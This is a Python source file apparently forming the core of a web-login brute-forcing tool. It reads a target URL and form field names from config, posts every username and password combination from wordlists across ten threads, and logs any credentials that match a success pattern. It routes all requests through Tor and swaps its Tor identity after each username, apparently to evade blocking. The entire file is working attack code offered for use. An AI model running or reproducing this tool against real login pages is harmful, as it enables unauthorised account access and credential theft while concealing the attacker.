import logging
import re
from configparser import ConfigParser
from multiprocessing.pool import ThreadPool

import requests
from alive_progress import alive_it

from ..generator import PasswdGenerator
from ..onion import TorProxy
from .cli_parser import Args

__all__ = ["App"]


class App:
    N_PROCESS = 10  #! DO NOT CHANGE THIS VALUE

    def __init__(self, args: Args) -> None:
        self.logger = logging.getLogger(".".join(__name__.split(".")[1:]))
        self.cfg = ConfigParser()
        self.cfg.read(args.cfg_path)

        self.session = requests.Session()
        self.target = re.compile(self.cfg["url-endpoints"]["target"])
        self.post_url = self.cfg["url-endpoints"]["post_url"]

        self.username_field = self.cfg["html-fields"]["username_field"]
        self.password_field = self.cfg["html-fields"]["password_field"]

        self.username_path = args.usernames
        self.password_path = args.passwords
        self.it_comb = args.it_comb

    def post_search(self, username_field: str, password_field: str) -> bool:
        self.session.cookies.clear_session_cookies()
        response: requests.Response = None
        try_no = 0
        while try_no < 3 and (not response or response.status_code != 200):
            try:
                response = self.session.post(
                    self.post_url,
                    data={
                        self.username_field: username_field,
                        self.password_field: password_field,
                    },
                    allow_redirects=True,
                    timeout=10,  # 10 seconds
                )
            except:  # noqa
                self.logger.debug("exception fallback ... retrying ...")
                try_no += 1
        else:
            if not response:
                self.logger.critical("failed to connect to the target")

        if self.target.search(response.text):
            self.logger.info(
                "🎉 Login successful using %s:%s",
                username_field,
                password_field,
            )

    def run(self):
        user = PasswdGenerator(self.username_path, self.it_comb[0])
        passwd = PasswdGenerator(self.password_path, self.it_comb[1])

        digits = len(str(user.count))  # number of digits of the total

        self.logger.info("Starting Tor 🧄 session ...")
        with TorProxy() as tor:
            self.session.proxies = {
                "http": f"socks5h://localhost:{tor.port}",  # Use Tor for HTTP connections
            }

            with ThreadPool(self.N_PROCESS) as pool:
                for i, u in enumerate(user()):
                    for _ in alive_it(
                        pool.imap_unordered(
                            lambda p: self.post_search(u, p[:]),  # noqa
                            passwd(),  # todo: faster gen after 1st time
                        ),
                        passwd.count,
                        title=f"on user n° {(i+1):0{digits}}/{user.count}",
                    ):
                        ...

                    tor.identity_swap()

        self.logger.info("Done ✅")
